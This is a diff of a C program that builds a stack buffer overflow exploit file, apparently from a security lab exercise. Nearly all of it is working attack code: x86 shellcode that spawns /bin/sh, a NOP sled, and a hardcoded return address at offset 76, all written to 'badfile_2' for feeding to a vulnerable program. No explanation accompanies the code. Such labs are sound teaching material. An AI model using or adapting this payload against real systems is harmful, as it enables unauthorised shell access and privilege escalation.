@@ -2,7 +2,7 @@
 #include <stdio.h>
 #include <string.h>
 
-char shellcode[]=  "\x31\xc0"            
+char shellcode[]=  "\x31\xc0"
     "\x50"                 /* pushl   %eax                   */
     "\x68""//sh"           /* pushl   $0x68732f2f            */
     "\x68""/bin"           /* pushl   $0x6e69622f            */
@@ -15,27 +15,29 @@ char shellcode[]=  "\x31\xc0"
     "\xcd\x80"             /* int     $0x80                  */
 ;              
 
-unsigned long stack_ptr(){
-    __asm__("movl %esp,%eax");
-}
+char taraddr[] = "\x20""\xee""\xff""\xbf";
 
 void main(int argc, char **argv)
 {
-    char buffer[517];
+    char buffer[100];
     memset(&buffer, 0x90, sizeof(buffer));
+	int i = 76 - sizeof(shellcode) - 1;
+	int end = i + sizeof(shellcode), start = i;
+    for(; i<end; i++){
+		buffer[i] = shellcode[i-start];
+	}
+	buffer[i-1] = 0x90;
 
-    char *ptr;
-    int offset = 100, bsz = 517, i;
-    long *addr_ptr = buffer, addr = stack_ptr() + offset;
+	for(i=76; i<76+sizeof(taraddr); i++){
+		buffer[i] = taraddr[i-76];
+	}  
+	buffer[i-1] = 0x90;
+/*    for(i; i<78; i++){
+		buffer[i] = 'A';	
+	}*/
 
-    for (i = 0; i < 24; i++)
-    	*(addr_ptr++) = addr;
-
-    for (i = 0; i < strlen(shellcode); i++) 
-     	buffer[bsz - (sizeof(shellcode) + 1) + i] = shellcode[i];
-
-    buffer[bsz - 1] = '\0';
+    buffer[99] = '\0';
     FILE *badfile = fopen("./badfile_2", "w");
-    fwrite(buffer, 517, 1, badfile);
+    fwrite(buffer, 100, 1, badfile);
     fclose(badfile);
 }
